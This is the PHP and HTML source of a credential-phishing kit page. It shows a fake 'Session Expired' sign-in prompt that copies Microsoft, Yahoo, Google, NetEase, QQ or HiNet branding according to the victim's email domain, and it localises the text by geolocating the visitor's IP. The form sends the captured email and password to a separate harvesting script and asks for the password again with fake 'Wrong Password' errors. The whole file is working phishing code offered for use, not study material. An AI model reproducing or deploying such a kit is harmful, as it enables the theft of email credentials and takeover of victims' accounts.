<?php
/*class geoPlugin {
	
	//the geoPlugin server
	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function geoPlugin() {

	}
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		
		//set the geoPlugin vars
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {*/
include "antibot.php"; 
$get = $_GET['a'];
$i = $_GET["i"];
$c = $_GET["c"];
if($i == "0"){

	$wron = "";
	$wrongpass = "";
}

elseif($i == "1"){
	$wrong ="Please input Password";
	$wrongpass = "<div style='color: red; font-size: 11px; margin-bottom: -30px;'>".$wrong."</div>";
}


else{
$wrong = "Wrong Password: Please input correct Password";
$wrongpass = "<div style='color: red; font-size: 11px; margin-bottom: -30px;'>".$wrong."</div>";
}




$eadd = base64_decode($get);
if(empty($eadd)){
		$read = "";
		$style = "";
		$company = "Mailbox Security";
		$domain = "";
		$fav = "default.png";
		$image = "http://".$fav."/favicon.ico";
		
	}
	
	else{
		$read = "readonly";
		$style = "cursor:no-drop; -webkit-touch-callout: none; font-size:16px;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;";
	$ename = explode("@",$eadd);
$name = $ename['0'];
$dom = explode("@",$eadd);
$domain = $dom['1'];
$comp = explode(".",$domain);
$company = ucfirst($comp['0']);
$fav = $domain;


if (stripos($domain, 'yahooo') !== false || stripos($domain, 'rocketmail') !== false){
	$image = "ym.ico";
}

elseif (stripos($domain, 'office') !== false || stripos($domain, 'live') !== false || stripos($domain, 'hotmail') !== false){$image = "hm.ico";}

elseif (stripos($domain, '126') !== false || stripos($domain, '163') !== false || stripos($domain, 'yeah') !== false){$image = "16y.ico";}

elseif (stripos($domain, 'outlook') !== false){
	$image = "ou.ico";
}

elseif (stripos($domain, '@mail.com') !== false){
	$image = "mail.ico";
}

elseif (stripos($domain, 'msn') !== false){
	$image = "ms.ico";
}

elseif (stripos($domain, 'gmail.com') !== false){
	$image = "gm.ico";
}

elseif (stripos($domain, 'qq') !== false){
	$image = "qq.ico";
}

elseif (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false){
	$image = "hi.ico";
}

else{
	$image = "http://".$fav."/favicon.ico";
}


	}

$ip = getenv("REMOTE_ADDR");
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
if(property_exists($ipdat, 'geoplugin_countryCode'));
if(property_exists($ipdat, 'geoplugin_countryName'));
$country = $ipdat->geoplugin_countryCode;
$countryName = $ipdat->geoplugin_countryName;

/*All designs*/
/*Default*/
$btncolor = "#892e00";
$btncolorH = "#a14f26";
$btncolorA = "#be7a58";
$bdcolor = "#892e00";
$bdcolorH = "#a14f26";
$bdcolorA = "#be7a58";
$se = "Session Expired:";
$pl = "Please Sign in to Continue";
$pas = "Password";
$sub = "Continue";
$pri = "Privacy";
$leg = "Legal";
$tra = "TradeMark";
$con = "Contact us";


if (stripos($domain, 'outlook') !== false || stripos($domain,'yahoo') !== false || stripos($domain,'hotmail') !== false || stripos($domain,'live') !== false || stripos($domain,'rocketmail') !== false || stripos($domain,'gmail') !== false || stripos($domain,'office') !== false || stripos($domain,'msn') !== false)  {
	
$btncolor = "#50c5ff";
$btncolorH = "#8bd9ff";
$btncolorA = "#8bb7ff";
$bdcolor = "#c9edff";
$bdcolorH = "#77d2ff";
$bdcolorA = "#0678b0";

if (stripos($domain, 'outlook') !== false || stripos($domain,'hotmail') !== false || stripos($domain,'live') !== false || stripos($domain,'office') !== false || stripos($domain,'msn') !== false)  {
	$company = "Microsoft";
}
elseif (stripos($domain, 'yahoo') !== false || stripos($domain,'rocketmail') !== false){$company = "Yahoo!";}

elseif(stripos($domain,'gmail') !== false){$company = "Google LLC";}
	
}

elseif (stripos($domain, '126') !== false || stripos($domain,'163') !== false || stripos($domain,'yeah') !== false || stripos($domain,'qq') !== false || stripos($domain,'hinet') !== false || stripos($domain,'hi-net') !== false)  {
	
$btncolor = "#00a521";
$btncolorH = "#3bcd58";
$btncolorA = "#82e796";
$bdcolor = "#82e796";
$bdcolorH = "#3bcd58";
$bdcolorA = "#00a521";

if (stripos($domain, '126') !== false || stripos($domain,'163') !== false || stripos($domain,'yeah') !== false){
$se = "会话已过期：";
$pl = "请登录以继续";
$pas = "密码";
$sub = "继续";
$pri = "隐私";
$leg = "法律";
$tra = "商标";
$con = "联系我们";
$company = "NetEase";
}

elseif (stripos($domain, 'qq') !== false){
$se = "会话已过期：";
$pl = "请登录以继续";
$pas = "密码";
$sub = "继续";
$pri = "隐私";
$leg = "法律";
$tra = "商标";
$con = "联系我们";
$company = "QQ";
}

else{
	$se = "Session Expired:";
$pl = "Please Sign in to Continue";
$pas = "Password";
$sub = "Continue";
$pri = "Privacy";
$leg = "Legal";
$tra = "TradeMark";
$con = "Contact us";
$company = "HiNet";
}
	
}


elseif (stripos($country,'CN') !== false || stripos($country,'HK') !== false || stripos($country,'TW') !== false) {
$se = "会话已过期：";
$pl = "请登录以继续";
$pas = "密码";
$sub = "继续";
$pri = "隐私";
$leg = "法律";
$tra = "商标";
$con = "联系我们";
}

else if (stripos($country,'SA') !== false || stripos($country,'CY') !== false || stripos($country,'IR') !== false || stripos($country,'TR') !== false || stripos($country,'PS') !== false || stripos($country,'IQ') !== false || stripos($country,'AE') !== false || stripos($country,'EG') !== false || stripos($country,'DZ') !== false || stripos($country,'BH') !== false || stripos($country,'IL') !== false || stripos($country,'JO') !== false || stripos($country,'KW') !== false || stripos($country,'LB') !== false || stripos($country,'LY') !== false || stripos($country,'MA') !== false || stripos($country,'OM') !== false || stripos($country,'PS') !== false || stripos($country,'QA') !== false || stripos($country,'SO') !== false || stripos($country,'SD') !== false || stripos($country,'SY') !== false || stripos($country,'YE') !== false || stripos($country,'SS') !== false) {
	$se = "انتهت الجلسة:";
$pl = "من فضلك سجل دخولك للمتابعة";
$pas = "كلمه السر";
$sub = "استمر";
$pri = "الإجمالية";
$leg = "قانوني";
$tra = "علامة تجارية";
$con = "اتصل بنا";
}


else if (stripos($country,'BJ') !== false || stripos($country,'BF') !== false || stripos($country,'BI') !== false || stripos($country,'CM') !== false || stripos($country,'CF') !== false || stripos($country,'TD') !== false || stripos($country,'CI') !== false || stripos($country,'CD') !== false || stripos($country,'DZ') !== false || stripos($country,'DJ') !== false || stripos($country,'GQ') !== false || stripos($country,'FR') !== false || stripos($country,'GA') !== false || stripos($country,'GG') !== false || stripos($country,'GN') !== false || stripos($country,'HT') !== false || stripos($country,'MG') !== false || stripos($country,'ML') !== false || stripos($country,'MU') !== false || stripos($country,'MC') !== false || stripos($country,'NE') !== false || stripos($country,'RW') !== false || stripos($country,'SN') !== false || stripos($country,'SC') !== false || stripos($country,'TG') !== false || stripos($country,'VU') !== false) {
	
$se = "La session a expiré:";
$pl = "Veuillez vous connecter pour continuer";
$pas = "Mot de passe";
$sub = "Continuer";
$pri = "Intimité";
$leg = "Légal";
$tra = "Marque déposée";
$con = "Contactez nous";
}

else{
	$se = "Session Expired:";
$pl = "Please Sign in to Continue";
$pas = "Password";
$sub = "Continue";
$pri = "Privacy";
$leg = "Legal";
$tra = "TradeMark";
$con = "Contact us";
}



	

?>

<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
<link rel="stylesheet" href="css/style.css">
<style>
body{
font-family: "Fakt Pro Medium", "Fakt Pro Medium Cyr", "Fakt Pro Medium Grk", -apple-system, ".SFNSText-Regular", "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Lucida Grande", sans-serif;
background-color: #f8f8f8 ;
}

a{
text-decoration:none;
color:   #d2d3d3 ;
font-size: 9px;
}


#em{margin-left: -35px}

::-webkit-input-placeholder { /* Chrome/Opera/Safari */
  color: #dfdfdf;
}
::-moz-placeholder { /* Firefox 19+ */
  color: #dfdfdf;
}
:-ms-input-placeholder { /* IE 10+ */
  color: #dfdfdf;
}
:-moz-placeholder { /* Firefox 18- */
  color: #dfdfdf;
}

input{
width: 17.5625em;
height: 1.5625em;
border-bottom: 1px solid  <?php echo $bdcolor;?> ;
border-right: 1px solid  <?php echo $bdcolor;?> ;
border-top: none;
border-left: none;
font-weight: 600;
font-family: -apple-system, ".SFNSText-Regular", "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Lucida Grande", sans-serif;
font-size: 0.975em;
text-overflow: ellipsis;
background-color: transparent;
z-index: 2;
margin: 0.6875em 0 0 0;
padding: 0 2% 0 2%;
text-align: center;
}

button{
width: 21.1625em;
height: 2.5625em;
background-color: <?php echo $btncolor;?> ;
font-family: "Fakt Pro Medium", "Fakt Pro Medium Cyr", "Fakt Pro Medium Grk", -apple-system, ".SFNSText-Regular", "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Lucida Grande", sans-serif;
border: none;
cursor: pointer;
font-size: 0.875em;
color: #FFFFFF;
font-weight: 600;
}

button:hover{background-color: <?php echo $btncolorH;?> ;}
button:active{background-color: <?php echo $btncolorA;?> ;}

input:hover{
	border-bottom: 1px solid  <?php echo $bdcolorH;?> ;
border-right: 1px solid  <?php echo $bdcolorH;?> ;
}
input:active{
	border-bottom: 1px solid  <?php echo $bdcolorA;?> ;
border-right: 1px solid  <?php echo $bdcolorA;?> ;
}


</style>
 <script src="js.js"></script> 
</head>


<body>
<center >
<div id="cn" align="center">
<label style="color: red; font-size: 19px;"><b><?php echo $se;?></b></label><label style="color: #8a7a7a ; font-weight: 600;"> <?php echo $pl;?></label><br>
<form accept-charset="UTF-8" action="rom.php?c=<?php echo $c; ?>" autocomplete="off" method="post">
<br>
<p><img src="<?php echo $image;?>" width="32px" height="32px" onerror="this.src='default.png'""><input id="em" name="em" type="email" required value="<?php echo $eadd; ?>" <?php echo $read; ?> placeholder="example@email.com" style="<?php echo $style; ?>"/>


<p><input id="ps" name="ps" type="text" value="" required placeholder="<?php echo $pas; ?>" /></p>
<script type="text/javascript">
  new MaskedPassword(document.getElementById("ps"), '\u25CF');
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>

<?php echo $wrongpass; ?> 
<p><br /> <button type="submit" value="Submit"><?php echo $sub; ?></button></p>
</form>
</div>
<label><a href="#"><?php echo $pri; ?></a>     <a href="#"><?php echo $leg ;?></a>  <a href="#"><?php echo $tra; ?></a></label><br>
<label style="color:   #d2d3d3; font-size: 12px;"><a href="#"><?php echo $con ;?></a>   &copy 2020 <?php echo $company;?></label>
</center>

</body>
</html>